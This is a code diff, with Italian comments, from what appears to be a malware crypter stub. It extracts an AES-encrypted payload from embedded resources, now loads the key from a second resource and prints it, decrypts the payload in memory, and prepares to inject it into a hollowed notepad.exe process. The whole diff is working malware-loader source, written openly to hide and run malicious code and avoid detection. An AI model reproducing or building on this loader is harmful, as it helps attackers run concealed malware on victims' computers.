@@ -72,20 +72,22 @@ unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* 
 int main(){
     //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguitp
     unsigned long malwareLen;
-    
+    unsigned long keyLen;
 
-    unsigned char key[] = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
-        0xab, 0xf7, 0x97, 0x71, 0xc1, 0x8c, 0x2e, 0x2a,
-        0x08, 0x88, 0x3e, 0x55, 0xa8, 0x9c, 0x0f, 0xf4,
-        0x92, 0xa7, 0x45, 0x58, 0x4f, 0x18, 0x33, 0x22};
+    unsigned char* key;
+
     //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
-    unsigned char*resourcePtr = GetResource(69, "BIN", &malwareLen); 
+    unsigned char* resourcePtr = GetResource(69, "BIN", &malwareLen); 
+    key = GetResource(420,"BIN", &keyLen);
 
+    for(int i = 0; i< 32; i++){
+        printf("%x\n", key[i]);
+    }
     unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
     memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
     printf("%d",malwareLen);
 
-    AESDecrypt(malware, malwareLen, (char *)key, sizeof(key)); //decrypto il malware e lo salvo in pe
+    AESDecrypt(malware, malwareLen, (char *)key, 32); //decrypto il malware e lo salvo in pe
 
     void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
     Sleep(1500);
@@ -107,7 +109,7 @@ int main(){
 
     void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE
 ////////////////////////
-    char currentFilePath[1024]; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
+    char currentFilePath[1024] = "C:\\Windows\\System32\\notepad.exe"; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
 /////////////////////////
     DOSHeader = PIMAGE_DOS_HEADER(pe);   // assegno a DOSHeader il puntatore al DOSHeader
     NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
